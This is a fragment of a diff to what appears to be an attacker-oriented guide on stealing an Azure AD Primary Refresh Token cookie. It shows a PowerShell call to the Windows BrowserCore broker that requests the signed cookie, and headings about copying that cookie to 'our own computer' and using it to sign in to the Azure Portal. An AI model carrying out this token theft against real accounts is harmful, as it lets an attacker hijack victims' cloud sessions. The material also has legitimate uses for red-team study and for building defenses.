@@ -59,17 +59,17 @@ Use the Primary Refresh Token together with the Proof of Possession Key to digit
             "sender":"https://login.microsoftonline.com"
         }'
 
-        $broker = "$env:ProgramFiles\Windows Security\BrowserCore\brosercore.exe"
+        $broker = "$env:ProgramFiles\Windows Security\BrowserCore\browsercore.exe"
 
         $response = Invoke-Broker -BrokerPath $broker -Request $request
 
         $response
 
-### 1) 
+### 2) Copy the cookie to our own computer for usage 
 
-### 6) Use the PRT cookie
+## Use the PRT cookie
 
-Access the Azure Portal (example)
+### 6) Access the Azure Portal (example)
 
 Go to Developer's tools
 
